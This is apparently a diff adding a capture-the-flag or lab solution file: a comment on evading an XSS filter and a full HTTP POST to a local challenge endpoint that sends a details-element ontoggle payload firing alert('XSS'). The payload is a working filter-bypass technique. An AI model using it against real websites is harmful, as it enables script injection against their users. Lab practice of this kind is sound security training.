@@ -1,0 +1,8 @@
+# XSS bypass using ontoggle event handler on details element. Filters block script, onerror, onload, and single quotes but ontoggle with double quotes bypasses all filters.
+
+POST /xss25 HTTP/1.1
+Host: 172.17.0.1:38325
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+
+solution=<details open ontoggle=alert("XSS")>
